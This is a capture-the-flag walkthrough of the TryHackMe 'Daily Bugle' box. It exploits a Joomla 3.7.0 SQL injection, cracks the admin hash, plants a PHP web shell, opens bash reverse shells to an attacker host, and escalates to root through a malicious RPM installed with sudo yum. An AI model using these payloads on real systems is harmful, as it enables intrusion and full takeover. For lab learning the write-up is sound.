---
layout: post
title:  "Daily Bugle Writeup"
date:   2024-06-18 00:00:00 -0400
categories: tryhackme hard
tags: writeup tryhackme hard CTF sqli GTFOBin
---
## Introduction
This is a hard challenge box on
[TryHackMe](https://tryhackme.com/r/room/dailybugle){:target="_blank"}{:rel="noopener noreferrer"}.
It'll take 2 minutes for this machine 
to configure

> This is what a hint will look like!
{: .prompt-tip }

## Enumeration
### Port Scan
Let's start with a port scan to see what services are
accessible

```bash
rustscan -a VICTIM_IP -- -A -oA scan -sC
```

![scan1](/images/dailybugle/scan1.png)

![scan2](/images/dailybugle/scan2.png)

There are three ports open
- 22: SSH
- 80: HTTP
- 3306: MYSQL

### Web Server
Now we should investigate the web server on port `80`

![homepage](/images/dailybugle/homepage.png)

We have the answer to the first question. `Spiderman`
robbed the bank!

Now let's check `robots.txt` for any hidden directories

![robots](/images/dailybugle/robots.png)

We know that the server is running `Joomla` and there
are quite a few hidden directories. Let's visit
`/administrator` and see if we can find anything

![admin login](/images/dailybugle/admin-login.png)

A login page! Keep this in mind while we continue
enumeration

### Joomla
> Do some research to learn how to find Joomla's
> version
{: .prompt-tip }

The next question asks for the Joomla version. Using
*search engine here* I found
[this post](https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website){:target="_blank"}{:rel="noopener noreferrer"}.
By visiting `/administrator/manifests/files/joomla.xml`
we'll be able to find information about the joomla
installation!

![joomla version](/images/dailybugle/joomla-version.png)

This web server is running Joomla version `3.7.0`

## Initial Foothold
> Are there any public exploits for this version of Joomla?
{: .prompt-tip }

We have a service along with a version so use your
favorite search engine and find a public exploit! The
box hints at using a python script rather than SQLMap.

After some searching,
[this github repo](https://github.com/stefanlucas/Exploit-Joomla){:target="_blank"}{:rel="noopener noreferrer"}
comes up. This will exploit an sql injection on Joomla
version 3.7.0!

Let's pull the code so we can run it
```bash
git pull https://github.com/stefanlucas/Exploit-Joomla
```

There is a single python script called `joomblah.py`
so let's run it, passing the machine IP

```bash
python3 joomblah.py http://VICTIM_IP
```

![sql injection](/images/dailybugle/sqli.png)

We found one user along with a password hash. Let's
place both of these into a file called `crack.txt`

```
jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

Now we can crack this hash with the password cracker
[john the ripper](https://github.com/openwall/john){:target="_blank"}{:rel="noopener noreferrer"}

```bash
john –wordlist=/usr/share/wordlists/rockyou.txt –fork=3 –progress-every=30 crack.txt
```

![crack](/images/dailybugle/crack.png)

We have the password for the user `jonah`! Recall that
we found the admin login page earlier in the `/administrator`
directory, so let's try to log in

### Web Shell
> Edit some `php` files to get a shell
{: .prompt-tip }

![admin dashboard](/images/dailybugle/admin-dashboard.png)

We're in! But now what? Our user is able to edit `php`
files, so we can install our own webshell!

First go to the `Templates` section

![templates](/images/dailybugle/templates.png)

Then find the `Protostar` templates which will have the
`php` files. Next we need to add a web shell. This
[reverse shell generator](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}
also has a web shell section

I'll be using this web shell

```php
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

Now let's add this to `index.php` and save it

![save webshell](/images/dailybugle/save-webshell.png)

When we visit the homepage with the `cmd` parameter set
to a command, that command should be run and the output
will be printed to the screen. Let's test this

```
http://VICTIM_IP/?cmd=ls%20-la
```

![webshell test](/images/dailybugle/webshell-test.png)

### Reverse Shell
We can run single commands on the server, so let's get
a full shell. Again we can use this
[reverse shell generator](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}.
There are multiple different options and if one doesn't
work, make sure to try another one!
> Remember to change the IP and Port values to your
> machine's IP and listening port
{: .prompt-tip }

To make things simple the `bash -i` payload with `URL Encoding`
will work here

```
%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261
```

Let's set up a listener on our machine to catch the request

```bash
nc -lvnp 4444
```

Then we can send our reverse shell payload through the
web shell

![revshell](/images/dailybugle/revshell.png)

We can upgrade and stabilize our shell with the following

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# ctrl + z to background the shell
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
```

This will remove repeating commands, give us tab completion,
and allows us to use ctrl+c!

## Horizontal Escalation
> Are there credentials that are reused?
{: .prompt-tip }

In order to set up the database, there are usually
credentials we can read in configuration or initialization
`php` files

With this in mind let's check `configuration.php`

![user password](/images/dailybugle/user-pwd.png)

This could be used to access the `mysql` database
with

```bash
mysql -u root -p
```

But it's also important to try the credentials elsewhere!
By reading `/etc/passwd` or checking `/home` we see
another user, `jjameson`

Let's switch to this user with `su` and use the password
we just found

![su](/images/dailybugle/su.png)

Now we can read the user flag

![user flag](/images/dailybugle/user-flag.png)

## Root
> What are `jjameson`'s `sudo` permissions?
{: .prompt-tip }

Since we're a new user we should see what privileged
commands we can run

```bash
sudo -l
```

![sudo permissions](/images/dailybugle/sudo-perms.png)

We can run `/usr/bin/yum` as `root` without a password.
By checking
[GTFOBins](https://gtfobins.github.io/gtfobins/yum/#sudo){:target="_blank"}{:rel="noopener noreferrer"}
we see a way to run arbitrary commands with `yum` run
through `sudo`!

> This will take some preparation on the attacking machine. 
{: .prompt-tip }

First let's create
a file which will run our commands. In this case I
wrote this reverse shell payload to `rev.sh`


```bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Next we need to install
[fpm](https://github.com/jordansissel/fpm){:target="_blank"}{:rel="noopener noreferrer"}
to create a package. We can do this with `ruby` by
running

```bash
sudo gem install fpm
```

If we try to run the
[GTFOBin](https://gtfobins.github.io/gtfobins/yum/#sudo){:target="_blank"}{:rel="noopener noreferrer"}
command immediately we get the following error

![rpm error](/images/dailybugle/rpm-error.png)

We need to run `rpmbuild` so we also need to install the
`rpm` package

```bash
sudo apt-get install rpm
```

Now we should be able to build our package with the
command

```bash
fpm -n x -s dir -t rpm -a all --before-install rev.sh .
```

This will create a file called `x-1.0-1.noarch.rpm` we
need to upload to the machine. To upload we can
use a `python3` web server.

On the attacking machine run a web server in the same
directory as the `x-1.0-1.noarch.rpm` file

```bash
python3 -m http.server 80
```

On the victim machine we can grab this file with the
`wget` command

```bash
wget http://ATTACKER_IP/x-1.0-1.noarch.rpm
```

![rpm upload](/images/dailybugle/rpm-upload.png)

Let's set up a listener on the attacking machine to
catch the reverse shell request

```bash
nc -lvnp 4444
```

Everything should be set. Now we can run the following
to get a `root` reverse shell and read the final flag

```bash
sudo yum localinstall -y x-1.0-1.noarch.rpm
```

![root flag](/images/dailybugle/root-flag.png)

## Conclusion
By enumerating the web server we found it was running
a version of Joomla vulnerable to SQL injection.
Using a public exploit we were able to leak Joomla
credentials which we cracked to get access to the
admin dashboard. Then we added a web shell to the
template files and upgraded to a reverse shell.
Next we read a configuration file to find a reused
password for the `jjameson` user. Checking this new
user's permissions, we found the `yum` command was
able to be run with `sudo`. Checking 
[GTFOBins](https://gtfobins.github.io/){:target="_blank"}{:rel="noopener noreferrer"}
we found a corresponding entry for `yum` which gave us
a `root` shell.
